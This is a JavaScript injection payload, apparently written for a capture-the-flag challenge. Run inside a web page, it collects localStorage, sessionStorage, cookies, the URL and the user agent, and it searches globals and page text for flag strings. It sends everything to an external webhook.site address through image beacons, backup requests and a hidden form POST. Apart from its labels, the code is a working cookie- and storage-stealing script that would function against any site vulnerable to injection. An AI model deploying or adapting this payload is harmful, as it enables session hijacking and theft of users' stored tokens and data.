     console.log('🚩 LIVE CTF FLAG EXTRACTION PAYLOAD');

     // Immediate webhook function for flag extraction
     function sendWebhook(data) {
         try {
             const img = new Image();
             const params = new URLSearchParams();
             Object.keys(data).forEach(key => {
                 params.append(key, typeof data[key] === 'object' ? JSON.stringify(data[key]) : data[key]);
             });
             img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/LIVE-FLAG?' + params.toString();
             document.body.appendChild(img);
             console.log('🚩 Flag webhook sent:', data.status);
         } catch(e) {
             console.error('Webhook failed:', e);
         }
     }

     // Send initial confirmation
     sendWebhook({
         status: 'LIVE_CTF_PAYLOAD_EXECUTING',
         timestamp: new Date().toISOString(),
         domain: window.location.hostname,
         url: window.location.href,
         origin: window.location.origin,
         user_agent: navigator.userAgent
     });

     // IMMEDIATE FLAG EXTRACTION ATTEMPT
     try {
         // Extract flag from localStorage
         const flag = localStorage.getItem('flag');

         // Get all localStorage data for analysis
         const allStorage = {};
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
             allStorage[key] = localStorage.getItem(key);
         }

         // Get sessionStorage too
         const sessionData = {};
         for (let i = 0; i < sessionStorage.length; i++) {
             const key = sessionStorage.key(i);
             sessionData[key] = sessionStorage.getItem(key);
         }

         // Send comprehensive data
         sendWebhook({
             status: 'LIVE_FLAG_EXTRACTION_COMPLETE',
             timestamp: new Date().toISOString(),
             flag: flag || 'FLAG_NOT_FOUND',
             flag_exists: !!flag,
             domain: window.location.hostname,
             origin: window.location.origin,
             url: window.location.href,
             localStorage_data: JSON.stringify(allStorage),
             localStorage_count: localStorage.length,
             sessionStorage_data: JSON.stringify(sessionData),
             sessionStorage_count: sessionStorage.length,
             cookies: document.cookie || 'no_cookies',
             referrer: document.referrer || 'no_referrer'
         });

         // If flag found, send multiple confirmations
         if (flag) {
             console.log('🚩🚩🚩 LIVE CTF FLAG FOUND:', flag);

             // Primary flag confirmation
             sendWebhook({
                 status: 'LIVE_CTF_FLAG_CAPTURED',
                 flag: flag,
                 timestamp: new Date().toISOString(),
                 domain: window.location.hostname,
                 extraction_method: 'localStorage_direct'
             });

             // Backup flag transmission methods
             const flagImg1 = new Image();
             flagImg1.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/FLAG-BACKUP1?flag=' +
                           encodeURIComponent(flag) + '&domain=' + encodeURIComponent(window.location.hostname) +
                           '&timestamp=' + Date.now();
             document.body.appendChild(flagImg1);

             const flagImg2 = new Image();
             flagImg2.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/FLAG-BACKUP2?data=' +
                           encodeURIComponent(JSON.stringify({
                               flag: flag,
                               domain: window.location.hostname,
                               timestamp: new Date().toISOString(),
                               method: 'live_ctf_extraction'
                           }));
             document.body.appendChild(flagImg2);

             // Form submission backup
             try {
                 const form = document.createElement('form');
                 form.method = 'POST';
                 form.action = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a';
                 form.target = '_blank';
                 form.style.display = 'none';

                 const flagInput = document.createElement('input');
                 flagInput.type = 'hidden';
                 flagInput.name = 'LIVE_CTF_FLAG';
                 flagInput.value = flag;

                 const domainInput = document.createElement('input');
                 domainInput.type = 'hidden';
                 domainInput.name = 'domain';
                 domainInput.value = window.location.hostname;

                 const timestampInput = document.createElement('input');
                 timestampInput.type = 'hidden';
                 timestampInput.name = 'timestamp';
                 timestampInput.value = new Date().toISOString();

                 form.appendChild(flagInput);
                 form.appendChild(domainInput);
                 form.appendChild(timestampInput);
                 document.body.appendChild(form);
                 form.submit();
             } catch(e) {}
         } else {
             // Flag not found - send diagnostic info
             sendWebhook({
                 status: 'LIVE_CTF_FLAG_NOT_FOUND',
                 timestamp: new Date().toISOString(),
                 domain: window.location.hostname,
                 localStorage_keys: Object.keys(allStorage),
                 sessionStorage_keys: Object.keys(sessionData),
                 total_storage_items: localStorage.length + sessionStorage.length,
                 diagnostic: 'flag_key_missing_from_storage'
             });
         }

     } catch(error) {
         // Error during extraction
         sendWebhook({
             status: 'LIVE_CTF_EXTRACTION_ERROR',
             timestamp: new Date().toISOString(),
             error: error.message,
             stack: error.stack,
             domain: window.location.hostname
         });
     }

     // Try to access global variables that might contain flag
     setTimeout(() => {
         try {
             const globalVars = [];
             for (let prop in window) {
                 try {
                     if (typeof window[prop] === 'string' &&
                         (window[prop].includes('flag{') || window[prop].includes('FLAG{'))) {
                         globalVars.push({name: prop, value: window[prop]});
                     }
                 } catch(e) {}
             }

             if (globalVars.length > 0) {
                 sendWebhook({
                     status: 'LIVE_CTF_GLOBAL_FLAGS_FOUND',
                     timestamp: new Date().toISOString(),
                     flags: JSON.stringify(globalVars),
                     domain: window.location.hostname
                 });
             }
         } catch(e) {}
     }, 1000);

     // Check for flag in DOM elements
     setTimeout(() => {
         try {
             const textContent = document.body.innerText || document.body.textContent || '';
             const flagMatches = textContent.match(/flag\{[^}]+\}/gi) || [];

             if (flagMatches.length > 0) {
                 sendWebhook({
                     status: 'LIVE_CTF_DOM_FLAGS_FOUND',
                     timestamp: new Date().toISOString(),
                     flags: JSON.stringify(flagMatches),
                     domain: window.location.hostname
                 });
             }
         } catch(e) {}
     }, 2000);

     console.log('🚩 Live CTF flag extraction payload completed');
